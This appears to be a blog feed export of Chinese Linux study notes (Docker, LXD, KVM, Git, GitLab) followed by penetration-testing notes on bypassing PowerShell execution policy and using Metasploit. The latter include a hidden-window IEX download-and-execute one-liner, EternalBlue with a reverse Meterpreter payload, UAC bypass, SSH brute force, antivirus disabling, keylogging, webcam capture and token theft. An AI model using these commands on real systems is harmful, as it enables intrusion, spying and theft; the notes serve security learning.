docker attach doasdkop463fd # 进入容器 apt update &amp;&amp; apt install apache2 # 正常操作 /etc/init.d/apache2 start ctrl+p, ctrl+Q # 宿主机浏览器访问 http://宿主机ip:8080 ## 服务自动启动(或者手动把下面内容输入进去) echo '/etc/init.d/apache2 start' >> /etc/bash/rc ## 基于配置好的容器创建新的镜像 docker commit ubuntu xps/apache1:0.1 # 创建了新的image # 打包好之后上传到hub，就可以正常下载和使用image了 Dockerfiles 前面的下载，制作，上传，再下载的方法也挺麻烦的 使用Dockerfile自动创建映像（Dockerfile文本文件，包含创建容器的指令） 这里还是以apacha2为例1.先写配置文件 # vim Dockerfile FROM ubuntu # 从官方下载镜像 MAINTAINER xps &lt;xps@admin.com> RUN apt update; apt dist-upgrade -y RUN apt install -y apache2 vim RUN echo '/etc/init.d/apache2 start' >> /etc/bash/rc 2.基于dockerfile来创建容器 # 标签自己定义即可, 最后的点(.) 表示当前目录下的dockerfile docker build -t test/apache-server:1.0 . # 然后run创建启动容器 docker run -dit -p 8080:80 test/apache-server:1.0 /bin/bash PS: 更深入的Dockerfile知识再另外学 LXD特点 - lxd 新部署容器过程比Docker更容易 - 退出容器时不必以特定的方式退出 - lxd 容器中没有层的概念 - Docker中的层可以使部署更快(没有清理也可能感觉混乱) 安装 # snap适用所有发行版本 sudo snap install lxd # sudo apt install lxd # ubuntu官方包apt一般中不会是最新的软件包 sudo usermod -aG lxd ${USER} # 当前用户加入lxd组，就具有管理权限了 # 重启主机 初始化 lxd init # 回答问题(默认即可) 运行容器 # 创建容器 lxc launch ubuntu:18.04 C01 # C01是容器名称 # 自动从远程服务器下载映像并创建、运行容器(从国外下载，速度稍微慢) # - lxd命令针对lxd管理层 # - 容器管理命令仍然使用lxc 常用管理命令 lxc list # 列出所有的容器 lxc start c_name # 启动容器 lxc stop c_name # 停止容器 lxc delete c_name # 删除容器 lxc image list # 查看镜像 lxc image delete # 删除镜像 交互登录容器 # 执行某个容器的什么命令 lxc exec C01 bash # root帐号登录 lxc exec C01 -- sudo --login --user ubuntu # ubuntu镜像包含一个默认账户ubuntu # 在本地终端直接执行容器内部的命令 lxc exec C01 -- apt update # 退出容器(容器依然是run的状态) ctrl+D / exit 随宿主机的启动, 自动启动某个容器 lxc config set C01 boot.autostart 1 远程映像存储服务器 # 列出远程映像存储服务器 lxc remote list # 默认三个 - images # 存储其他Linux发行版镜像 - ubuntu # ubuntu自己正式发布的系统镜像 - ubuntu-daily # ubuntu自己的非正式的系统镜像(每天更新的) 从远程复制映像 lxc launch images:debian/stretch test01 # 只下载映像到本地，不创建容器 lxc image copy ubuntu-daily:18.10 local: --alias u1910 lxc image list # 查看本地的映像 # 从本地映像来创建容器 lxc launch u1910 c03 # 查看本地容器 lxc list 对容器进行上传下载文件 # 直接在宿主机器上执行 lxc file pull c01/etc/hosts . # 把文件下载到当前目录 lxc file push hosts c01/tmp/ # 上传文件到容器中路径 # 当然，也可以进入交互shell复制 lxc exec C01 bash 映像自动更新间隔(小时) # 每隔24小时自动更新映像 lxc config set images.auto_update_interval 24 自动清除未使用的映像(天数) lxc config ser images.remote_cache_expiry 5 查看配置 lxc config show 实例 # 安装apache2 lxc exec c01 bash apt update &amp;&amp; apt install apache2 ip addr show curl 1.1.1.1 外部网络对容器内部访问 - 防火墙规则路由流量 - 创建配置我呢见DHCP 获取物理网络地址(类似VM) - 宿主机创建桥接网卡 br0 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>容器</tag>
        <tag>Docker</tag>
        <tag>LXD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-虚拟化]]></title>
    <url>%2Fposts%2F64674%2F</url>
    <content type="text"><![CDATA[云计算 资源就像水龙头里的水，按需索取 信息时代计算资源是最主要的生产力 主机时代、网络时代 集中和分散、三十年河东三十年河西 量子计算可能颠覆一切 计算资源的云化 按需调度、按需索取 计算资源需要更大程度的颗粒度细化 虚拟化是计算资源细分的基础 处理器运算能力的大幅提升 处理速度月来越快（摩尔定律） 多核处理器架构 大量计算资源限制浪费，企业整体运行成本高 多应用同机部署，应用隔离差，稳定性影响大 处理器支持虚拟化技术 分类1.Saas： Software as a Service # 软件即服务， 服务以软件形式交付 Gmail / Google Docs / 在线Office / Office 365 ... 无需本地安装部署 2.PaaS： Platform as a Service # 平台即服务 提供软件开发运行的基础平台 API、Google App Engine 3.IaaS： Infrastructure as a Service # 基础架构即服务 最底层的晕计算，物理的计算、存储、网络资源饭各位你 AWS、Google Computer Engine、 阿里云 云计算是将资源打碎、分配、发布、交付的一组工具的合集 Hypervisors -&gt; 使得虚拟服务器的性能不依赖物理机，和物理机是平行的，可以直接访问物理的CPU # 常见的虚拟化软件 KVM、XEN(目前部署方式是完整的光盘)、QEMU、Virtualbox、VMWare # 本章主要学这两个：KVM、EMU 云计算平台 # ubuntu上最典型的 Openstack 服务编排工具 # 典型的 Juju 机器配置工具 MAAS 虚拟化 物理服务器，部署虚拟化平台，创建多个虚拟机，每个虚拟机使用物理机的计算量。虚拟化是云计算的基础 降低成本，提高利用率，方便管理部署，快速恢复还原 普遍用于开发测试实验、生产环境部署都可 需要硬件支持(BIOS设置开启) CPU特性 Hypervision KVMKernel-based Virtual Machine（KVM） 基于内核的虚拟机(KVM)和快速仿真器(QEMU)组成的虚拟化套件( QEMU/KVM ) QEMU/KVM在没有硬件虚拟化支持下，虚拟机需要运行在QEMU模拟器中 有硬件虚拟化支持下，接近硬件物理机速度运行 虚拟化扩展决定性能( virtualization extensions ) Ubuntu默认内建支持的虚拟化方案 内建于Linux内核( Intel 的kvm-intel.ko或AMD的kvm-amd.ko ) libvirt库是Linux与虚拟化通信的统一 接口 处理在主机和客户机之间分离任务所需的低级指令 无法并行运行VirtualBox和KVM虛拟机，它们会抢占CPU的虚拟化功能 把KVM和QEMU结合在一起通过libvirt库实现Linux与虚拟化通信的接口 验证硬件平台支持虚拟化拓展(较新的硬件全部支持)四种方法 # F1 egrep -c '(vmx|svm)' /proc/cpuinfo # 结果不为0即支持 erep -E 'vmx|svm' /proc/cpuinfo # 结果不为0即支持 # F2 kvm-ok # sudo apt install cpu-checker # F3 lscpu # 找下列字段： # Virtualization: VT-x # Flags: vmx # F4 sudo virt-host-validate # sudo apt install libvirt-client # Checking for hardware virtualizatin: PASS 可以在virtualbox或vmware虚拟机里面安装kvm的虚拟机 KVM安装和使用安装服务端组件# bridge-utils桥接的防止，用来做地址转换的 sudo apt install bridge-utils libvirt-bin qemu-kvm qemu-system # 当前用户会被加入livirt组 # 需要重启系统使得权限生效 # 映像文件目录(以后的虚拟机文件都会放在这里) /var/lib/libcirt/images # 配置文件 /etc/libvirt/libvirtd.conf 权限(读写,管理)的修改，加密证书等。一般不需要配置。 安装客户端组件1.图形化的客户端管理工具# 1.图形化的管理工具(virt-manager)，ssh-askpass是用来ssh连接远程主机使用的 sudo apt install virt-manager ssh-askpass # 客户端的使用 可以新建连接：选择连接哪个机器(本机、远程机器)的kvm后台 创建虚拟机:跟virtualbox的就类似了，Add Pool指定iso文件的路径来挂载寻找 # 2.也有字符界面的客户端管理工具 网卡桥接配置默认虚拟机网络模式为NAT（可以访问外部网络，但外部计算机无法访问虚拟机），可以使用网桥实现VM被外部网络访问 网桥的配置 # sudo vim /etc/netplan/50-cloud-init.yaml # 新增配置 ethernets: ens33: dhcp4: no # 这个分给网桥，所以这个物理网卡不能有ip地址 dhcp6: no bridegs: # 配置网桥 br0: interfaces: [ens33] dhcp4: no addresses: [172.16.24.13/24] gatewat4: 172.16.24.1 nameservers: addresses: [8.8.8.8,8.8.4.4] # 让配置生效 sudo netplan apply 虚拟机配置：选择虚拟机，选择第二个窗口，选择网卡，Bridge模式，选择设备，启动虚拟机 建立连接 virt-manager 本机/ 网络 连接 virt-manager 基本使用 克隆创建虚拟机 KVM不支持模板功能，但可将虚拟机关机作为模板使用(右键，clone, 基于它作为"模板") # 创建虚拟机快，占资源少 虚拟机管理控制台（有很多好用的功能） 迁移(Migrate) –&gt; 把某宿主机上(出现故障了)某台虚拟机迁移到另一台安装了kvm服务的服务器上 2.命令行客户端 命令行方便写脚本，·批量进行很多虚拟机的安装和管理 创建虚拟机 # 命令行创建虚拟机 virt-install sudo virt-install -n web1 -r 2048 --disk path=/var/lib/libcire/images/web1.img,bus=virtio,size=10 -c ubuntu-18.04-server-amd64.iso --newwork newtork=default,model=virtio --graphics vnc, listen=0.0.0.0 --noautoconsele -v # --disk path 虚拟机镜像文件存放路径 # size=4 硬盘文件大小4G # bus=virtio 总线类型 # -c CDROM（iso文件、物理光驱） # --newwork newtork=default，model=virtio 接口模式 # --graphics vnc, listen=0.0.0.0 VNC控制接口 # --noautoconsele 不自动连接虚拟机控制台 复制虚拟机 sudo virt-clone -o win10 -n win10-2 -f /var/lib/libcire/images/win10-2.img # -o 原始虚拟机 # -n 新建虚拟机 # -f 虚拟机镜像文件存放路径 建立连接 virsh connect qemu:///192.168.0.12 查看vm服务器上所有VM # 查看run的 virsh list # 查看所有状态的 virsh list --all 管理VM virsh console centos_01 关闭当前console ctrl + ] 正常关机 virsh shutdown centos_01 强制关机 virsh destory centos_01 删除虚拟机 virsh undefine centos_01 挂起VM virsh suspend centos_01 恢复使用VM virsh resume centos_01 使用云平台下载适合不同环境的镜像: https://cloud-images.ubuntu.com/releases/bionic/release wget /ubuntu-18.04-server-cloudimg-amd64.img -O u18.img.dist 解压下载的镜像文件 qemu-img convert -O qcow2 u18.img.dist u18.img # 不能直接使用，可以理解这个为一个模板 创建用户数据文件 vim cloud-config # cloud-config passwdor: 123465 chpasswd: { expire: Flase } # 密码不过期 ssh_pwauth: True # 允许ssh身份认证 生成用户数据盘 # 基于模板创建一个新的数据盘 cloud-localds user-data.img cloud-config # 使用上面的配置文件 启动虚拟机 kvm -m 2048 -smp 2 -hda u18.img -hdb user-data.img -net nic -net user,hostfwd=tcp::1810-:22 -nographic # 帐号密码: ubuntu / 123465(上面配置文件指定的) sudo passwd ubuntu # 修改密码 删除云镜像初始化脚本 sudo apt-get remove cloud-init 使用云镜像创建VM 部署完一个之后，就可以基于第一个进行clone document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>KVM</tag>
        <tag>虚拟化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-版本控制]]></title>
    <url>%2Fposts%2F52930%2F</url>
    <content type="text"><![CDATA[107-版本控制概述简介version control system（版本控制系统）revision control system (修订控制系统) 开发工具，但不仅限于源码文件 记录文件的每次变更 随时可以回到历史状态 文件以及元数据的变更（修改人、修改理由、具体修改内容、时间戳） 配置文件是除数据之外第二大资产 团队写作 分类 Centralized version control systems (SVCS) 集中式版本控制 集中存储修改，颗粒控制细，但是单点故障隐患 CSV / Subersion distributed version control systems (DVCS) 分布式版本控制 分布式存储库的完整拷贝 Git / Mercurial / Bazaar(Ubuntu官方在开发时候使用的) 每个人维护本地库，完成后上传到服务器 指针指向当前最新版本随着回滚还原历史版本 Git 最初由Linux内核创始人开发 Git作为开发工具而生 适合大型项目的版本管理 Git库保存所有程序员的团队成果 Git默认使用OpenSSH 服务器上的Git用户需要能够修改目录(库) 一个库就是一个文件夹(库配置信息: .git目录) 无需独立的专职服务器，满足存储空间需求可共用 github目前世界上最大的代码托管服务商（已被微软收购） 服务端安装 # 1. ubuntu自带的(和git自带的版本不一样,不是最新的) # sudo -s 把自己提升成root权限，后面就不用输入sudo了 apt install git mkdir /git # 创建一个文件夹(后续作为一些git库的存放位置) chown xps:xps /git cd /git git init --bare apache2 # 创建一个裸库,名字叫apache2（空的框架库，不存在数据） /var/log/auth.log # ssh登录问题诊断 # 2.使用ppa库方式安装 sudo add-apt-repository ppa:git-core/ppa sudo apt update sudo apt install git git version # 版本比ubuntu库中的新 然后和上面一样创建存放git库的目录 客户端使用 # 客户端和服务端都是安装的同一个git软件包 # 其实客户端本身也可以作为一个本地的git服务器 # 基本配置 git config --global user.name "Your Name" git config --global user.email "eamail@domain.com" git config --list # 查看配置信息 git help # 查看常用的git二级命令 git help -a # 查看所有的子命令 git help -g # 查看所有的子命令, 并有描述 git help everyday # man giteveryday 查看具体某一个子命令的用法 git客户端连接服务器 mkdir /git # 同样创建一个文件夹 chown xps:xps /git cd /git # 作为客户端，从远程服务端clone库(是服务端的绝对路径) git clone xps@192.168.0.105:/git/web # .git目录存放配置信息(使之成为git库)，删除此目录就是一个普通文件夹 # 其中config文件包含远程服务器地址信息(写好之后以后就不用手动输入信息；) [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote "origin"] url = xps@192.168.0.105:/git/web fetch = +refs/heads/*:refs/remotes/origin/* [branch "master"] remote = origin merge = refs/heads/master 常用git命令# 查看状态 git status # 追加变更到git的追踪 git add . # 所有文件 git add file_name # 指定文件 # 提交变更给本地git库 git commit -a -m "第一次提交" # 同步到服务器（orign等在config文件已经写好了） # 提交之前必须服务器的内容是最新的版本，先git pull, 再push git push orign master # 从服务器更新 git pull # 服务端数据存储结构与客户端不同(数据库) # 撤销文件的变更(不仅仅对文件，对版本也可撤销) git checkout &lt;file> # 回退最近的版本 # 比对来查看文件的修改变化 git diff index.html # 内容(对比的两个文件) --- a/4.conf +++ b/4.conf ########### 切回历史上任何一个版本 apt install tig # 方法很多，这里使用了tig tig # 直接查看历史版本(移动到版本上，下面会有版本号hash值)，回车会看到具体变更内容 git checkout ddwe23e353c0d6665406e7c07djaoid2d # 切回到指定版本 # 只是指针临时指向了之前的版本，没显示后面的版本(但是后面的版本还是存在的) # 如果验证没问题，先回到最新状态 git checkout master # 回滚(只是回滚那一个版本的所做的变更, 不是回退到那，也不影响之后的版本) --> 从当前最新版本的基础山，去掉前面某一个版本中所做的变更 git revert master ddwe23e353c0d6665406e7c07djaoid2d 不仅仅的对代码，对配置文件也可以是个好习惯 # 例子 :apache的配置文件 cp -rp /etc/apache2 /etc/apache2.bak mv /etc/apache2/* /git/apache2 rm /etc/apache2 # 这里千万不能重启 find /git/apache2 -name '.?*' -prune -o -exec chown root:root {} + # 排除.git(.?*)，其他的都改为root ln -s /git/apache2 /etc/apache2 # 做个软链接(可以让应用读取到配置文件) systemctl reload apache2 # 以后修改就在git仓库修改，并进行add和commit和push，以便出问题回滚 Github 开源项目可以使用，前面自己在服务器搭建的git服务器可以自己公司用(商用的肯定要自己内部建版本控制服务器)机密&amp;隐私信息不建议放到开源平台 创建并同步新库 ## 1.在本地新建(已有库)，然后关联到github仓库 echo "# new" >> README.md git init git add README.md git commit -m "first" git remote add origin https://github.com/xps/new.git # 连接远程仓库，同步现有库 git pull # 先把服务器的版本同步到本地，然后才能正常提交 git push -u origin master # 提交到远程github仓库 # 如果要用ssh协议， 要在github的仓库的setting的的Deploy Key # 然后本地 .ssd/id_rsa.pub 公钥粘贴上去 # 然后就不用输入密码了 ## 2.在github新建，然后clone下来，再提交 GitHub pages通过github上传页面文件建站(目前只是静态的) # 新建库名为： user_name.github.io # 现在本地创建已有库也行(参照同步到github库) git clone https://github.com/user_name.github.io cd user_name.github.io/ echo "hello world" > index.html # 可以在本地设置好页面(静态网站)，再上传 git add . git commit -m "init commit" git remote add origin https://github.com/user_name.github.io git push -u origin master # 浏览器访问 https://user_name.github.io SSH Key连接库Clonr or Download -> CLone with SSH Setting -> Deploy keys -> Add git clone git @github.com:xps/test.git GitLabGitLab是开源的Git库Web界面（包含团队写协作工具 GitLab mattermost -&gt;即时聊天沟通的）基于Ruby语言开发的Web应用程序所有组件全部打包集成（Postgresql, redis, nginx, logrotate, Sidekiq, Unicron）如果想要要支持MySQL数据库，社区版需要手动安装安装需求 最小：单核，1GB，适当存储空间(400MB)，100用户以下(建议双核、2GB以上) 安装 ### 集成安装方式 https://packages.gitlab.com/gitlab/gitlab-ce/ # ubuntu(安装软件源) curl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | sudo bash # 开始安装(等待时间比较长) sudo apt install gitlab-ce # 自动初始化配置 sudo gitlab-ctl reconfigure # 查看状态 sudo gitlab-ctl status # 然后就可以访问了， 设置初始root帐号密码 # 默认是只有一个root管理员 # 和github等的使用体验是类似的 配置 /etc/gitlab/gitlab.rb # 配置文件 external_url # 指定访问域名(也可以启用https) letsencrypt 也集成了 # 免费https database # 指定外部PosgreSQL数据库 email # 设置出站邮件服务器(注册帐号链接等) sudo gitlab-ctl reconfigure # 每次修改后都要重新配置 fitlab-ctl show-config # 显示已经启用的配置 sudo gitlab-ctl status 常用命令 sudo gitlab-ctl status # 查看状态 sudo gitlab-ctl stop # 停止gitlab sudo gitlab-ctl start # 启动gitlab sudo gitlab-ctl restart # 重启gitlab sudo gitlab-ctl tail # 查看所有日志 sudo gitlab-ctl tail nginx/gitlab_access.log # 查看nginx访问日志 sudo gitlab-ctl tail postgresql # 查看postgresql访问日志 新建用户帐号F1: 管理员登录 -&gt; 扳手图标(全局设置) -&gt; 用户 普通用户的创建库的限制一般设置为0 创建帐号的时候不能设置密码(是发送邮件他自己设置)，但是创建完成之后再次点击用户就可以修改密码了 F2: 默认是支持普通用户自助注册的(不建议，因为一般是在企业内部使用) # 限制/禁用普通用户自助注册 管理员登录 -> 扳手图标(全局设置) -> Setting Sign-up Restrictions(注册限制) -> Sign-up enable 不选中 # 禁用自助；只允许手动创建帐号 Send confirmation email on sign-up -> 指定邮箱域名白名单(*.lab.com) Doamin Blacklist -> 设置黑名单 建库设置(私有,内部,公开) -&gt; 选择库成员(设置–&gt;成员-&gt;设置用户权限和期限)，clone，同步默认是http协议访问，可以改为ssh公钥访问 一定程度上支持中文(settings -&gt; Perferences -&gt; Language) 普通用户第一次登录也要重新设置密码，就可以在本地clone项目库，然后就可以同步了(其他步骤同github) 用户设置 – Profile 邮件，名称(给别人看，方式穷举暴力破解) # 用户资料 full name 修改 email 修改, 且不公开 帐号名称 Account -> root修改为别的 # 安全 # 帐号(路径这里才是) 修改得隐蔽一点 SSH Key ssh-keygen # 现在本机生成公钥 ~/.ssh/id_rsa.pub # 生成的公钥 Add Key # 拷贝公钥到gitlab的key的地方 禁止普通用户建库 设置用户可创建0个库(Project) Accoumt and Limit Settings -> Default projects limit -> 0 Let’s Encrypt证书更新 # 自动更新时间 vim /etc/gitlab/gitlab.rb letsencrypt['auto_renew'] = true # 开启自动更新 letsencrypt['auto_renew_hour'] = "12" # 每12个小时 letsencrypt['auto_renew_minute'] = "30" # 30分钟 letsencrypt['auto_renew_day_of_month'] = "*/7" # 每隔7天 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>Git</tag>
        <tag>GitLab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PowerShell执行策略的简单绕过]]></title>
    <url>%2Fposts%2F15127%2F</url>
    <content type="text"><![CDATA[执行策略Get-ExecutionPolicy #查看当前策略 # 四种 - Restricted #脚本不能运行（默认） - RemoteSigned #本地创建的脚本可以运行，但从网上下载的脚本不能运行 - AllSigned #仅当脚本由信任的发布者签名时才能运行 - Unrestricted #允许所有的脚本运行 # 设置PowerShell执行策略 Set-ExecutionPolicy &lt;策略名> 绕过1. # 先设置当前用户的执行策略为Unrestricted，也算是去更改了当前的全局策略 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted # 再执行脚本 2. # 或是下面这种，-Windowstyle hidden 可以让我们的执行无任何弹窗, -NoProfile不加载当前用户配置 powershell.exe -executionpolicy bypass -Windowstyle hidden -Noninteractive -nologo -NoProfile -File xxx.sp1 # Noexit 执行结束不退出shell(对键盘记录等脚本非常有用) 3. # 绕过本地权限执行 PowerShell.exe -ExecutionPolicy Bypass -File xxx.sp11 4. # 用IEX下载远程PS1脚本绕过 PowerShell.exe -ExecutionPolicy Bypass -Windowstyle hidden -Noninteractive -NoProfile IEX(New-ObjectNet.WebClient).DownloadString("http://xxxxx.xxx.ps1");[Parameters] 5.更多执行策略绕过: https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>PowerShel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit初学-散记]]></title>
    <url>%2Fposts%2F48093%2F</url>
    <content type="text"><![CDATA[MSF 最牛X的地方是：支持整个渗透测试过程 理论方面 技术架构1.辅助模块（auxiliary）包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块 2.渗透攻击模块(exploits)利用程序，针对漏洞、权限进行利用，是主要使用的模块 3.攻击载荷模块(payload)用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取 4.空指令模块(nops) 5.编码器模块(encoders) 6.后渗透攻击模块(post) 7.免杀模块(evasion) 接口MSF有四种接口对外提供：msfconsole, msfcli, msfgui, msfweb 为什么要使用Metasploit开发版是没有生成报告的功能的（商业版才有），但是开发版的脚本更多，每个版本各有利弊 情报搜集阶段有数据库 威胁建模阶段 漏洞分析阶段 后渗透攻击模块 报告生成模块 使用MSF准备使用启动MSFmsfconsole可以配置数据库等 更新MSF apt-get update apt-get install metasploit-framework 软件安装目录 /usr/share/metasploit-framework # 数据目录(其中一些字典和脚本我们用的时候可以拿) 模块一个模块就是一个rb脚本 情报搜集 首先search 搜索有哪些可用的模块 1.网站敏感目录扫描： /usr/share/metasploit-framework/modules/auxiliary/scanner 里面自己看都有啥 ## 使用 brute_dirs, dir_listing, dir_Scanner等辅助模块来进行敏感目录扫描 # 他们主要使用暴力猜解的方式工作，需要提供目录字典 # 使用模块 use auxiliary/scanner/http/dir_scanner # 查看详细信息 info # 查看需要设置的参数 show options # 设置参数（取消设置参数是 unset） set RHOTS 192.168.0.101 set PATH /cms/ # 攻击 exploit # 返回上一级退出当前模块 back # 两个可选命令 setg, unsetg # 用于在msfconsole中设置或取消设置全局性的参数，从而避免重复输入相同的值 使用常用的辅助模块进行服务扫描(search scanner) 2.主机发现 ## 用于主机发现的辅助模块，位于 modules/auxiliary/scanner/discovery use /auxiliary/scanner/discovery/arp_sweep 还是nmap速度快, 可以直接在msf中使用nmap 3.端口扫描search portscan auxiliary/scanner/portscan/ack auxiliary/scanner/portscan/syn # 推荐这个(速度快，准确，不易被发现) auxiliary/scanner/portscan/xmas auxiliary/scanner/portscan/ftpbounce auxiliary/scanner/portscan/tcp use ...... show options set xxx 4.探测服务详细信息 5.服务查点用户服务扫描和查点的工具，通常以[server_name]_version命名 telnet服务查点(查哪些主机开了telnet服务，而namp是查看某主机开放了哪些服务) SSH服务查点 use auxiliary/scanner/ssh/ssh_version # 口令爆破 use auxiliary/scanner/ssh/ssh_login MSSQL服务查点 use auxiliary/scanner/mssql/mssql_version 永恒之蓝实践 # 先扫描是否存在 use auxiliary/scanner/smb/ms17_010_eternalblue ... # 载利用攻击模块 use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/reverse_tcp set RHOST ... ... exploit 漏洞利用收集完信息后，选择正确的exploit，payload 这里假设是Sambainfo exploit/multi/samba/usermap_sript, 可以查看到利用成功率Rank越高，成功率越大use exploit/multi/samba/usermap_sriptshow optionsset PAYLOAD cmd/unix/reverse… … Bypass UACuse exploit/windows/local/bypassuac set session 1 run Meterpreter（属于后渗透攻击） Metasploit框架中的一个扩展模块 作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接https://www.cnblogs.com/backlion/p/9484949.html Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。 # 优势 - 纯内存工作模式，不需要对内存进行写入操作 - 使用加密通信协议，且可以同时与几个信道通信 - 在被攻击进程内工作，不需要创建新的进程 - 易于在多进程之间迁移 - 平台通用 进程迁移刚获取Meterpreter shell的时候，是脆弱的(用户随时可能关闭)，所以第一时间是移动shell，把它和一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作(更不易被发现) ps # 获取目标正在运行的进程 getpid # 查看Meterpreter shell的进程号 mirate 448 # 把shell移动到PID为448的进程里(因为这里这个稳定，看情况来吧) getpid # 发现shell的进程迁移OK(原来的进程会自动关闭，如果没关闭就手动关掉：kill xxx_pid) # 自动迁移进程指令(系统会自动寻找合适的进程然后迁移) run post/windows/manage/migrate 常用命令 ########## 系统命令（收集系统信息） systeminfo # 查看系统信息 run post/windows/gather/checkv # 检查是否为虚拟机 idletime # 目标机器最近运行时间 ifconfig/ipconfig # 查看网卡信息 route # 查看路由信息，设置路由（做跳板用） background # 把会话放到后台，这个会话继续保持 sessions # 查看会话列表 sessions -i 2 # 进入切回会话2 getuid # 获取当前用户id权限 run post/windows/manage/killav # 关闭杀毒(其他命令自己探索) run post/windows/manage/enable_rdp # 开启目标机器的远程桌面 run post/windows/manage/autoroute # 查看目标机的本地子网情况 # 接着进行跳转 background # 把当前终端隐藏在后台 route add 192.168.0.111 255.255.255.0 1 # 给指定会话id添加路由(可以添加其他地址到被攻陷的机器的路由表上，借助被攻陷的机器来攻击其他网络) route print # 查看路由添加结果 # 接着查看 run post/windows/gather/enum_logged_on_users # 列举当前有多少用户登录了主机 run post/windows/gather/enum_logged_on_users # 继续列举安装在目标机器上的应用 run post/windows/gather/credentials/windows_autologin # 很多用户习惯将计算机设置自动登录(抓取自动登录的密码)，如果看不到任何信息，就需要拓展插件Expia load espia # 先加载该插件 screengrab # 就可以抓取此时目标机器的屏幕截图 screenshot # 也是截屏 webcam snap # 打开目标机器摄像头，拍摄一张照片 webcam_stream # 开始摄像头(直播模式)，在浏览器输入给出的url发那个问即可 shutdown # 关机 shell # 进入目标系统的shell下面 exit # 停止meterpreter会话（也可以停止shell并返回到meterpreter） quit # 关闭当前的Meterpreter会话，返回MSF终端 ########## 文件系统命令 pwd / getwd # 查看目标机器当前目录 getlwd # 查看本机当前目录 cd # 切换目录(注意\的转义) ls # 查看当前目录内容 search -f *.txt -d c: # 搜索文件（search -h 查看帮助） -d指定目录， -f搜索模式 upload /var/www/test.txt c:\ # 上传文件到目标机器的路径 download c:\test.txt # 下载文件(默认保存到msf的目录) cat # 查看文件内容 edit # 编辑文件 execute -f c:\\windows\\system32\\calc.exe # 执行文件 run keylogrecorder .... # 键盘记录？ 后渗透攻击：提权 纵向提权 横向提权 # 获取Meterpreter Shell之后，查看我们是什么权限 # Meterpreter 下输入 shell # 进入目标的cmd whoami /groups # 查看当前权限 ## 下面就开始进行提权了 # 用本地溢出漏洞，利用现成的exploit 1.利用WMIC实战MS16-032本地溢出漏洞 # WMIC是win一个命令行工具(交互模式/非交互模式)，不仅可管理本机还可管理域内所有远程主机(前提是有权限)，而被管理者不需要安装WMIC # WMIC在信息搜集和后渗透十分有用，可以调查目标机的进程，服务，用户，用户组，网络连接，硬盘信息，时区，操作系统信息等 # 假设拿到了Meterpreter shell getuid getsystem # 尝试提权，但是失败 # 接着查看系统打了的补丁(传统方法：在目标cmd输入systeminfo，或查询C:\windows\补丁号.log) # 这里利用WMIC命令列出安装的补丁 WMIC qfe get Caption,Description,HotFixID,IntalledOn # 找到打的补丁后，去找exp(然后将系统安装的补丁编号与提权exp编号比对，然后使用没有编号的exp进行提权) ## 漏洞信息网站： 安全焦点， Expolit-DB # 接下来准备提权(把Meterpreter放到后台：background), 然后搜索ms16-032 search ms16-032 # 如果找不到，可以试试升级：msfupdate 或者手动添加相应漏洞EXP use exploit/windows/local/ms16_032_secondary_logon_handle_privsec set session 1 run # 会返回一个新的session，进入，执行getuid 反省是system权限了 2.令牌窃取令牌(Token)就是系统的临时密钥, 相当与账户密码，特点是随机性和不可预测在假冒令牌攻击中需要使用Kerberos协议(一种网络认证协议，其设计目的是通过密钥系统为客户机/服务器应用程序提供强大的认证服务)Kerberos工作机制：xxx待补充 假冒令牌实战利用 # 假设已经拿到了Meterpreter shell getuid getsystem # 提权失败 use incognito list token -u # 